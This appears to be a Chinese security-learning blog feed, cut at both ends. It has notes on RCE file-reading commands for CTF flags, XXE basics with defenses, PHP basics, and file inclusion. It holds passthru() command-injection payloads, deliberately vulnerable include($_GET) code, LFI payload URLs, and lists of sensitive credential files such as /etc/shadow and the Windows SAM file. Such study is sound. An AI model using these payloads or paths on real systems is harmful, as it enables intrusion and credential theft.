id="2-more与less（一页一页的回显内容）"><a href="#2-more与less（一页一页的回显内容）" class="headerlink" title="2.more与less（一页一页的回显内容）"></a>2.more与less（一页一页的回显内容）</h5><blockquote><p>一页一页的帮我们显示内容 在linux中我们用more读取文件</p><p>时，它会先显示一页，然后我们敲个回车它就会显示下一面</p><p>我们做题的时候flag文件内容本来就少，使得more其实跟</p><p>cat的作用是一样的,当然less也是</p></blockquote><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819155404387.png" alt="image-20230819155404387"></p><p>more是页面没有显示完，可以按照页面百分百打印出来内容，随页面大小变化。</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819155449121.png" alt="image-20230819155449121"></p><p>less是开始页面没有显示完，会逐行打印。</p><h5 id="3-tail（输出文件末尾的10行内容）"><a href="#3-tail（输出文件末尾的10行内容）" class="headerlink" title="3.tail（输出文件末尾的10行内容）"></a>3.tail（输出文件末尾的10行内容）</h5><p>查看末尾的10行，除去这个，与cat相同</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819160446462.png" alt="image-20230819160446462"></p><h5 id="4-head（输出文件前十行内容）"><a href="#4-head（输出文件前十行内容）" class="headerlink" title="4.head（输出文件前十行内容）"></a>4.head（输出文件前十行内容）</h5><p>查看前面的10行，除去这个，与cat相同</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819160658613.png" alt="image-20230819160658613"></p><h5 id="5-nl（cat作用相同，而且能够顺便输出行号）"><a href="#5-nl（cat作用相同，而且能够顺便输出行号）" class="headerlink" title="5.nl（cat作用相同，而且能够顺便输出行号）"></a>5.nl（cat作用相同，而且能够顺便输出行号）</h5><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819161111439.png" alt="image-20230819161111439"></p><h5 id="6-od与xxd-查看文件二进制形式）"><a href="#6-od与xxd-查看文件二进制形式）" class="headerlink" title="6.od与xxd(查看文件二进制形式）"></a>6.od与xxd(查看文件二进制形式）</h5><p>以二进制形式查看源代码，当然它也可以加几个参数，转化一下，</p><p>能够看到assic码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;od -A d -c flag&quot;);</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819164230121.png" alt="image-20230819164230121"></p><h5 id="7-sort（将内容排序后输出出来）"><a href="#7-sort（将内容排序后输出出来）" class="headerlink" title="7.sort（将内容排序后输出出来）"></a>7.sort（将内容排序后输出出来）</h5><p>将内容排序后输出出来，效果是一样的</p><p>默认打印顺序是倒序，-R是随机排序</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819165043752.png" alt="image-20230819165043752"></p><h5 id="8-file-f-将报错信息回显到界面上"><a href="#8-file-f-将报错信息回显到界面上" class="headerlink" title="8.file -f(将报错信息回显到界面上)"></a>8.file -f(将报错信息回显到界面上)</h5><p>意思是将报错的信息回显到界面上</p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819165812042.png" alt="image-20230819165812042"></p><h5 id="9-grep（在指定文本中搜索指定字符串）"><a href="#9-grep（在指定文本中搜索指定字符串）" class="headerlink" title="9.grep（在指定文本中搜索指定字符串）"></a>9.grep（在指定文本中搜索指定字符串）</h5><p>在文本中搜索指定字符串，并将内容输出出来</p><p>*表示搜索当前目录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=passthru(&quot;grep flag *&quot;)</span><br></pre></td></tr></table></figure><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819170304882.png" alt="image-20230819170304882"></p><p><img src="/2023/08/15/rce%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20230819170519481.png" alt="image-20230819170519481"></p><h4 id="6-长度过滤"><a href="#6-长度过滤" class="headerlink" title="6.长度过滤"></a>6.长度过滤</h4><p>1.前置知识</p><p>(1)&gt;与&gt;&gt;</p>]]></content>
      
      
      <categories>
          
          <category> 命令学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xxe</title>
      <link href="/2023/08/08/xxe/"/>
      <url>/2023/08/08/xxe/</url>
      
        <content type="html"><![CDATA[<h2 id="xxe漏洞原理以及利用"><a href="#xxe漏洞原理以及利用" class="headerlink" title="xxe漏洞原理以及利用"></a>xxe漏洞原理以及利用</h2><p>xxe漏洞全称<code>XML External Entity Injection</code>,也就是xml外部实体注</p><p>入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加</p><p>载，导致<code>可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、</code></p><p><code>攻击内网网站、发起dos攻击等危害</code>。XXE漏洞触发的点往往是可以<code>上传</code></p><p><code>XML文件</code>的位置，没有对上传的XML文件进行过滤，导致可上传恶意XML文</p><p>件。</p><h2 id="常见的xxe漏洞类型"><a href="#常见的xxe漏洞类型" class="headerlink" title="常见的xxe漏洞类型"></a>常见的xxe漏洞类型</h2><blockquote><ul><li>典型注入：在这种情况下，外部实体包含在本地 DTD 中</li><li>盲注：响应中没有显示输出和/或错误</li><li>报错注入：尝试在错误消息中获取资源的内容</li></ul></blockquote><h2 id="XML基础知识"><a href="#XML基础知识" class="headerlink" title="XML基础知识"></a>XML基础知识</h2><p>XML指可扩展标记语言。</p><p>XML被设计用来传输和存储数据。</p><p>XML语言没有预定义的标签，允许作者定义自己的标签和自己的文档结构。</p><p>语法规则：</p><blockquote><p>XML文档必须有一个根元素<br>XML元素都必须有一个关闭标签<br>XML标签对大小写敏感<br>XML元素必须被正确的嵌套<br>XML属性必须加引导</p></blockquote><p>例如</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>m0re<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you know xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以通过浏览器访问来检查一下上面的规则。比如标签的字母大小写修改一</p><p>下还能不能和解析成功。</p><h3 id="实体引用"><a href="#实体引用" class="headerlink" title="实体引用"></a>实体引用</h3><p><img src="/2023/08/08/xxe/image-20230809162744204.png" alt="image-20230809162744204"></p><p>实体引用是因为在浏览器中直接使用这几个符号可能无法成功打印出来，可能会有歧义，所以就需要实体引用起作用了。</p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>DTD的作用是定义XML文档的合法构建模块。</p><p>DTD可以在XML文档内声明，也可以外部引用。</p><p>DTD的属性如下：</p><p><img src="/2023/08/08/xxe/image-20230809211937863.png" alt="image-20230809211937863"></p><p>示例：</p><p>1.内部声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encode=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">note</span>[</span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>.<span class="keyword">heading</span>, <span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ELEMENT <span class="keyword">to</span>     (<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ELEMENT <span class="keyword">from</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">      <span class="meta">&lt;!ELEMENT <span class="keyword">heading</span>(<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">        <span class="meta">&lt;!ELEMENT <span class="keyword">body</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">to</span>&gt;</span>more<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you kown xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line">      </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.外部引用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encode=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>more<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>blog<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">heading</span>&gt;</span>best xml<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">body</span>&gt;</span>Do you kown xml?<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- note.dtd --&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>.<span class="keyword">heading</span>, <span class="keyword">body</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span>     (<span class="keyword">#PCATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span>(<span class="keyword">#PCATA</span>)&gt;</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span>   (<span class="keyword">#PCATA</span>)&gt;</span></span><br></pre></td></tr></table></figure><p>默认属性值：</p><p>默认属性值可使用下列值</p><blockquote><p>值               解释</p><p>值               属性的默认值</p><p>#REQUIRED        属性值是必需的</p><p>#IMPLIED         属性不是必需的</p><p>#FIXED value     属性值是固定的</p></blockquote><p>两种方式是一样的，其实不加<code>&lt;!ELEMENT note </code></p><p><code>(to,from.heading,body)&gt;</code>这个也是可以显示出来相同的内容，这里的</p><p>例子知识为了说明这两种引</p><p>用方式一样。</p><p>这个是本地的，但是如果是允许web引用包含的话，危害就比较大了。</p><blockquote><p>外部声明默认协议及PHP扩展协议</p><p>libxml2   php                  Java          .NET</p><p>file      file                http            file</p><p>http      http                https           http</p><p>ftp       ftp                 ftp             https</p><p>​          php                 file            ftp</p><p>​          compress.zlib       jar</p><p>​          compress.bzip2      netdoc</p><p>​          data                mailto</p><p>​          glob                gopher  *</p><p>​          phar</p></blockquote><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><blockquote><p>1.禁止使用<strong>外部实体</strong>，例如：</p><p>PHP：libxml_disable_entity_loader(true)</p><p>2.过滤用户提交的xml数据，防止出现非法内容。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php学习</title>
      <link href="/2023/08/05/php%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/08/05/php%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="php基本知识"><a href="#php基本知识" class="headerlink" title="php基本知识"></a>php基本知识</h2><p>1.php(全称:PHP:Hypertext Preprocessor,即“PHP:超文本预处理器”)是一种通用开源脚本语言。</p><p>2.php脚本可以在服务器上执行。</p><h2 id="PHP语法"><a href="#PHP语法" class="headerlink" title="PHP语法"></a>PHP语法</h2><p>1.php脚本可以放在文档中的任何位置。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//PHP 代码</span></span><br><span class="line"><span class="comment">//这是PHP单行注释</span></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> 这是php多行注释</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="PHP变量"><a href="#PHP变量" class="headerlink" title="PHP变量"></a>PHP变量</h2><p>1.变量是用于存储信息的“容器”:</p>]]></content>
      
      
      <categories>
          
          <category> php基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ifi-labs靶场</title>
      <link href="/2023/08/03/Ifi-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2023/08/03/Ifi-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<p>CMD-1</p><p>打开页面，显示一个警告表示system()不能执行空白命令，也就是说后台存在system()的调用，</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞靶场学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞概述"><a href="#文件包含漏洞概述" class="headerlink" title="文件包含漏洞概述"></a>文件包含漏洞概述</h2><h3 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h3><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某个函数的时候，直接调用此文件，无需再次编写，这种调用文件的过程通常称为包含。</p><h3 id="文件包含漏洞产生原理"><a href="#文件包含漏洞产生原理" class="headerlink" title="文件包含漏洞产生原理"></a>文件包含漏洞产生原理</h3><p>文件包含函数加载的<code>参数没有经过严格过滤或严格定义</code>，可以被用户控制，包含其他恶意文件，导致执行了非预期代码。</p><p>这种包含可以是代码更加灵活，所以通常会把被包含的文件设置为变量进行动态调用，但正是由于这种灵活性，从而导致客户端可以调用任意文件，造成文件包含漏洞。</p><h4 id="1-常见的漏洞代码"><a href="#1-常见的漏洞代码" class="headerlink" title="1.常见的漏洞代码"></a>1.常见的漏洞代码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">   <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">   <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="2-访问-url"><a href="#2-访问-url" class="headerlink" title="2.访问  url"></a>2.访问  url</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/xxx.php?filename=show.php</span><br><span class="line"></span><br><span class="line">改变filename值即可改变代码中的包含文件</span><br></pre></td></tr></table></figure><p><code>$_GET[&#39;filename&#39;]</code>参数，如果开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><p>show.php即可为用户上传的可执行的恶意脚本文件</p><p>包含文件内容只要符合php语法都能被当成php代码进行解析，无关后缀名是什么。</p><h5 id="php相关配置"><a href="#php相关配置" class="headerlink" title="php相关配置"></a>php相关配置</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line"><span class="comment">// 本地文件包含(LFI)，但这个无论on或off，本地文件包含都存在</span></span><br><span class="line"></span><br><span class="line">allow_url_include=on</span><br><span class="line"><span class="comment">//  远程文件包含(RFI)</span></span><br></pre></td></tr></table></figure><p>3.漏洞成因分析</p><p>举个例子</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在创建一个phpinfo.php页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用文件包含，include函数来执行phpinfo.php页面，成功被解析</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802215646419.png" alt="image-20230802215646419"></p><p>将网站文件的phpinfo.php文件后缀改为txt后，修改url进行访问，也可以解析</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802220129455.png" alt="image-20230802220129455"></p><p>将网站文件的phpinfo.php文件后缀改为jpg后，修改url进行访问</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802220258739.png" alt="image-20230802220258739"></p><p>思考：php文件包含，为什么包含任意格式的文件都被当做PHP文件执行。</p><blockquote><p><strong>php文件包含主要由这四个函数完成：include(), require(), include_once(), require_once()。当使用这4个函数包含一个新的文件时，该文件作为php代码执行，php内核并不会在意该被包含文件是什么类型。所以如果被包含的是txt文件，图片文件、远程url，都会被当成php代码执行。</strong></p></blockquote><h4 id="3-存在文件包含的脚本语言及函数"><a href="#3-存在文件包含的脚本语言及函数" class="headerlink" title="3.存在文件包含的脚本语言及函数"></a>3.存在文件包含的脚本语言及函数</h4><ul><li><p>php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">require:函数出现错误时，会直接报错并退出程序执行</span><br><span class="line">require_once:出错直接退出，且仅包含一次。在脚本执行期间同一个文件可能被多次使用，确保包含一次以避免函数重新定义，变量重新赋值等问题。</span><br><span class="line">include:出现错误时，会出现警告但是程序会继续执行</span><br><span class="line">include_once:出现错误时，会抛出警告，且仅包含一次</span><br></pre></td></tr></table></figure></li></ul><p>错误是什么？</p><blockquote><p>两个函数发生错误，指的是包含的文件不存在时，而不是包含的文件内容有问题导致php代码解析报错，这种报错两个函数都会中断程序</p><p>require在这种情况会中断程序</p><p>include在这种情况会继续执行程序</p></blockquote><p>举个例子：</p><h5 id="require"><a href="#require" class="headerlink" title="require"></a>require</h5><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">require</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phptest/index.php?file=h.php</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802155056325.png" alt="image-20230802155056325"></p><p>由于h.php文件不存在，所以当执行到require ’h.php‘;这一行时，程序会中断执行，并返回一个致命错误。</p><h5 id="include"><a href="#include" class="headerlink" title="include"></a>include</h5><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello world!&quot;</span>;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/phptest/index.php?file=h.php</span><br></pre></td></tr></table></figure><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230802155426189.png" alt="image-20230802155426189"></p><p>由于h.php文件不存在，所以当执行include ’h.php‘;程序会继续执行，并返回一个警告，最终页面上会显示“hello world”</p><hr><ul><li><p>jsp/servlet</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.io.<span class="title function_ invoke__">file</span>()</span><br><span class="line">java.io.<span class="title function_ invoke__">filereader</span>()</span><br></pre></td></tr></table></figure></li><li><p>asp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> file</span><br><span class="line"><span class="keyword">include</span> virtual</span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="4-文件包含漏洞的危害"><a href="#4-文件包含漏洞的危害" class="headerlink" title="4.文件包含漏洞的危害"></a>4.文件包含漏洞的危害</h4><ol><li><p>敏感信息泄露</p></li><li><p>获取网站权限(webshell)</p></li><li><p>任意命令执行</p></li></ol><h1 id="文件包含漏洞类型"><a href="#文件包含漏洞类型" class="headerlink" title="文件包含漏洞类型"></a>文件包含漏洞类型</h1><h3 id="本地文件包含漏洞-LFI"><a href="#本地文件包含漏洞-LFI" class="headerlink" title="本地文件包含漏洞(LFI)"></a>本地文件包含漏洞(LFI)</h3><p>能够读取执行包含本地文件的漏洞，称为本地文件包含漏洞。</p><p>包含服务器本身存在的恶意文件</p><p>a.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>b.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$b</span>);</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/phptest/b.php?id=a.txt</span><br><span class="line">返回phpinfo页面</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><p>两个文件在同一目录下（若不在同一目录这被包含的文件路径必须写绝对路径或相对路径）</p><p>（相对路径./当前目录../上级目录）</p></li><li><p>被包含的页面的<code>后缀名无论是什么</code>都会当做php解析</p></li></ul><p> 能够打开并包含本地文件的漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网站利用文件包含功能读取一些php文件，例如phpinfo：</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230803110437948.png" alt="image-20230803110437948"></p><p>利用该代码，我们可以读取一些系统本地的敏感信息。</p><p>例如：<code>C:\Windows\system.ini</code>文件</p><p>(1)使用绝对路径</p><p>使用<code>绝对路径</code>直接读取：</p><p><img src="/2023/07/31/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20230803111922763.png" alt="image-20230803111922763"></p><p>(2)使用相对路径读取</p><p>通过 ./表示当前位置路径， ../表示上一级路径位置,在linux中同样适用。</p><p>例如</p><p><code>../../Windows/system.ini</code></p><p>(3)一些常见的敏感目录信息路径：</p><p>Windows系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\boot.ini    //查看系统版本</span><br><span class="line">C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件</span><br><span class="line">C:\windows\repair\sam //存储Windows系统初次安装的密码</span><br><span class="line">C:\ProgramFiles\mysql\my.ini //Mysql配置</span><br><span class="line">C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码</span><br><span class="line">C:\windows\php.ini //php配置信息</span><br></pre></td></tr></table></figure><p>linux系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/etc/password //账户信息</span><br><span class="line">/etc/shadow //账户密码信息</span><br><span class="line">/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件</span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置</span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关配置</span><br><span class="line">/etc/httpd/conf/httpd.conf //Apache配置文件</span><br><span class="line">/etc/my.conf //mysql配置文件</span><br></pre></td></tr></table></figure><h3 id="LFI漏洞利用技巧"><a href="#LFI漏洞利用技巧" class="headerlink" title="LFI漏洞利用技巧"></a>LFI漏洞利用技巧</h3><h4 id="1-配合文件上传使用"><a href="#1-配合文件上传使用" class="headerlink" 